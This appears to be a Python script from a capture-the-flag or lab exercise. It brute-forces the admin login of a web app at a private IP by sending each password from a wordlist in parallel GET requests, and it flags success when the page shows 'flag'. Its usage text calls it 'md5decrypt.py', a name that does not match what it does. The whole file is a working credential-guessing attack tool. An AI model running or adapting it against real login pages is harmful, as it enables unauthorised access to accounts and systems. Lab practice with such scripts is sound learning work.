import requests
from multiprocessing import Pool
import sys

if (len(sys.argv) != 2) :
    print ('Usage : python3 md5decrypt.py <WORDLIST>')
    sys.exit(1)


filename = sys.argv[1]

def bruteforce_login(password, URL= "http://192.168.1.20/index.php?page=signin") :
    password = password.rstrip()
#    if (password == "shadow") :
#        print("[*] Tried shadow")
    response = requests.get(URL + f"&username=admin&password={password}&Login=Login")
    if (response.text.find('flag') != -1) :
        print(f"[+] Found working password : {password}")

with open(filename, 'r', errors='replace') as wordlist :
    passwords = wordlist.readlines()

    with Pool(4) as pool :
        results = pool.map(bruteforce_login, passwords)
